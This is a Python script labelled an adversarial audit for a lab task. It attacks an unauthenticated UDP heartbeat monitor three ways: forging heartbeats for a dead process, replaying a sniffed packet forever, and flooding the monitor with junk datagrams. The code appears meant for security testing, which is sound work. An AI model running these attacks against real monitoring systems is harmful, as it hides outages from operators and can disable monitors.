"""Adversarial audit script (Task 5).

  spoof  : forge HEARTBEAT packets so the monitor thinks a dead service is alive.
  replay : sniff one real heartbeat, then resend that exact packet forever.
  flood  : spray junk datagrams at the monitor to test that it survives a DoS.

The baseline heartbeat has no authentication, so spoof and replay are expected to succeed.
"""
import argparse, json, os, socket, time

def spoof(target, pid, period):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    seq = 10**6
    print(f"spoofing heartbeats for pid {pid} -> {target}")
    while True:
        seq += 1
        s.sendto(json.dumps({"type": "HEARTBEAT", "pid": pid, "seq": seq, "ts": time.time(),
                             "events": 0}).encode(), target)
        time.sleep(period)

def replay(target, listen_port, period):
    # The attacker binds a port the service is told to send to (simulates sniffing the wire);
    # it forwards beats to the real monitor, keeps the last one, and replays it after the crash.
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("0.0.0.0", listen_port)); s.settimeout(period * 3)
    captured = None
    print(f"sniffing on UDP {listen_port}, forwarding to {target}")
    while True:
        try:
            captured, _ = s.recvfrom(2048)
            s.sendto(captured, target)
        except socket.timeout:
            if captured:
                break
    print(f"service went quiet; replaying captured packet forever: {captured[:80]!r}...")
    while True:
        s.sendto(captured, target)
        time.sleep(period)

def flood(target, count):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for i in range(count):
        s.sendto(os.urandom(64), target)
    print(f"sent {count} junk packets")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("attack", choices=["spoof", "replay", "flood"])
    ap.add_argument("--monitor", default="127.0.0.1:7000")
    ap.add_argument("--pid", type=int, default=0, help="spoof: pid of the dead service")
    ap.add_argument("--listen-port", type=int, default=7001, help="replay: sniffing port")
    ap.add_argument("--interval-ms", type=int, default=500)
    ap.add_argument("--count", type=int, default=50000)
    a = ap.parse_args()
    h, p = a.monitor.split(":"); target = (h, int(p)); T = a.interval_ms / 1000
    try:
        {"spoof": lambda: spoof(target, a.pid, T),
         "replay": lambda: replay(target, a.listen_port, T),
         "flood": lambda: flood(target, a.count)}[a.attack]()
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
